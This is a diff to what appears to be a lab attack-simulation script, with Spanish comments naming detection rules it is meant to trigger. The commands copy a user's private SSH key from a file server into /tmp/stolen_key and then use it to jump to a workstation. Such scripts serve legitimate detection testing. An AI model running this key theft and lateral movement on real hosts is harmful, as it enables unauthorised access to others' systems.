@@ -24,11 +24,12 @@ ssh -i /etc/ssh-keys/lab_runner_key -o StrictHostKeyChecking=no \
     lab@fileserver \
     "cat ~/.ssh/id_ed25519 2>/dev/null || cat ~/.ssh/id_rsa 2>/dev/null" \
     > /tmp/stolen_key 2>>"$LOG"
+chmod 600 /tmp/stolen_key
 
-# Paso 3: usar la clave para saltar a workstation (dispara reglas 100220, 100221)
+# Paso 3: usar la clave para saltar a workstation (dispara regla 100220)
 log_event "step3_lateral_jump"
-ssh -i /etc/ssh-keys/lab_runner_key -o StrictHostKeyChecking=no \
-    -o ProxyCommand="ssh -i /etc/ssh-keys/lab_runner_key -o StrictHostKeyChecking=no -W %h:%p lab@fileserver" \
+ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no \
+    -o ProxyCommand="ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no -W %h:%p lab@fileserver" \
     lab@workstation \
     "hostname; whoami; echo 'lateral_success'" \
     >> "$LOG" 2>&1
